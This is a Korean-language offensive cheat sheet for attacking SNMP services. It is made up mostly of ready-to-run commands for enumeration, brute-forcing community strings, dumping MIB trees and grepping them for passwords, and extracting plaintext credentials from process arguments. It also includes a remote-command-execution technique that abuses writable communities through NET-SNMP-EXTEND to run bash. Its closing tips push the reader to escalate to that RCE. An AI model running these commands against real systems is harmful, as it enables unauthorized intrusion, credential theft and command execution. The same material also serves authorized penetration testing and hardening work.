# SNMP

# SNMP (161 UDP)

네트워크 장비/호스트 관리 프로토콜. 기본 community string 하나로 시스템 정보, 네트워크 구성, 실행 프로세스, 설치 소프트웨어를 대량으로 긁어낼 수 있다. 특히 실행 중인 프로세스의 명령행 인자에 평문 비밀번호가 노출되는 경우가 많아, 단순 정찰을 넘어 자격증명 확보 수단이 된다. 쓰기 권한(RW) community 가 있으면 명령 실행까지 간다.

---

## 1. 열거

```bash
# nmap (UDP)
nmap -sU -p 161 -sV <IP>
nmap -sU -p 161 --script=snmp-info,snmp-sysdescr,snmp-processes,snmp-netstat,snmp-interfaces,snmp-win32-users <IP>

# community string 유효성 빠른 확인
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1.1.0   # sysDescr 하나만
snmpwalk -v 1  -c public <IP> 1.3.6.1.2.1.1.1.0   # v1 도 시도
```

---

## 2. Community String 브루트포스

유효한 community string 을 모르면 먼저 찾는다. UDP 라 응답 없는 것과 틀린 것의 구분이 약해, 전용 도구가 빠르다.

```bash
# onesixtyone (가장 빠름)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP>

# 서브넷 전체
onesixtyone -c community_strings.txt -i targets.txt

# nmap 스크립트
nmap -sU -p 161 --script=snmp-brute <IP>

# 흔한 기본값
#   public   (읽기, 기본)
#   private  (읽기/쓰기, 기본)
#   manager, community, snmpd, cisco, secret
```

---

## 3. 전체 수집 (snmpwalk / bulkwalk)

전체 MIB 트리를 통째로 떠놓고 grep 으로 캐는 게 실전 기본이다. v2c 는 bulkwalk 가 walk 보다 훨씬 빠르다.

```bash
# 전체 트리 덤프 (OID 생략하면 MIB-2만 나오니 1을 줄 것)
snmpbulkwalk -v 2c -c public <IP> 1 > snmp_full.txt     # v2c, 빠름
snmpwalk     -v 2c -c public <IP> 1 > snmp_full.txt     # bulkwalk 안 되면

# 값만 깔끔하게 (OID 번호 숨김)
snmpwalk -v 2c -c public -Oqv <IP> <OID>

# braa - 대량 OID 고속 조회
braa <community>@<IP>:.1.3.6.*
```

```bash
# 떠놓은 덤프에서 크리덴셜/정보 헌팅
grep -iE 'pass|pwd|user|login|key|secret|token' snmp_full.txt
grep -iE '@|http|ftp|smb|\\\\' snmp_full.txt          # 이메일, 링크, 공유 경로
```

---

## 4. 프로세스 인자 — 크리덴셜 헌팅 (핵심)

실행 중인 프로세스의 전체 명령행이 보인다. 백업 스크립트, DB 접속, 마운트 명령 등에 평문 비밀번호가 인자로 박혀 있는 경우가 많다. SNMP 의 최대 노다지다.

```bash
# 프로세스 이름
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2

# 프로세스 명령행 인자 (여기 비밀번호가 자주 있음)
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.5

# 인자만 깔끔히 뽑아 비번 패턴 검색
snmpwalk -v 2c -c public -Oqv <IP> 1.3.6.1.2.1.25.4.2.1.5 | grep -iE 'pass|pwd|-p |secret'
```

---

## 5. 주요 OID (정보 수집)

```bash
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1          # system (전체)
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.1.5        # sysName (호스트명)
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.2          # 네트워크 인터페이스
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.4.21       # 라우팅 테이블
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.3.1        # ARP (내부 IP 발견)
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.6.13       # 열린 TCP 포트
snmpwalk -v 2c -c public <IP> 1.3.6.1.2.1.25.6.3     # 설치된 소프트웨어
snmpwalk -v 2c -c public <IP> 1.3.6.1.4.1.77.1.2.25  # Windows 사용자 목록
```

---

## 6. 쓰기 권한 RCE (RW community)

쓰기 가능한 community(private 등)가 있고 대상이 Net-SNMP 데몬이면, NET-SNMP-EXTEND-MIB 로 임의 명령을 등록해 실행시킬 수 있다.

```bash
# 쓰기 권한 확인 - 값 변경이 되면 RW
snmpset -v 2c -c private <IP> 1.3.6.1.2.1.1.5.0 s "pwned"

# extend 로 명령 등록 (예: id 실행)
snmpset -v 2c -c private <IP> \
  'nsExtendStatus."cmd"'  i createAndGo \
  'nsExtendCommand."cmd"' s /bin/bash \
  'nsExtendArgs."cmd"'    s '-c "id"'

# 등록한 명령의 출력 읽기
snmpwalk -v 2c -c private <IP> 'nsExtendObjects'
snmpwalk -v 2c -c private <IP> 1.3.6.1.4.1.8072.1.3.2
```

---

## 7. 자동화 수집 (snmp-check)

```bash
snmp-check <IP>
snmp-check <IP> -c public -v 2c
```

snmp-check 는 시스템/네트워크/프로세스/사용자를 사람이 읽기 좋게 한 번에 정리해준다. 처음 훑을 때 유용하다.

---

## 8. SNMPv3

v3 는 community string 이 아니라 사용자/인증/암호화를 쓴다. 먼저 사용자명을 열거한다.

```bash
# nmap 으로 v3 사용자 열거
nmap -sU -p 161 --script=snmp-v3-enum <IP>

# 사용자명 확보 후 인증 시도 (예: SHA 인증 + AES 암호화)
snmpwalk -v 3 -u <user> -l authPriv -a SHA -A <authpass> -x AES -X <privpass> <IP> 1
```

---

## 팁

- UDP 161 이라 nmap 에 -sU 필수. TCP 스캔엔 안 잡힌다
- 전체 덤프 후 grep 이 기본 흐름이다. OID 하나씩 치는 것보다 snmp_full.txt 를 뜨고 캐는 게 빠르다
- 프로세스 인자(1.3.6.1.2.1.25.4.2.1.5)는 반드시 확인할 것. 평문 비번이 여기 자주 있다
- v2c 는 bulkwalk, 대량이면 braa 로 속도를 확보한다
- 쓰기 community 가 보이면 정보 수집에서 끝내지 말고 extend RCE 까지 시도한다
- SNMPv1/v2c 는 community 가 평문 전송이라 내부망 스니핑으로도 탈취된다
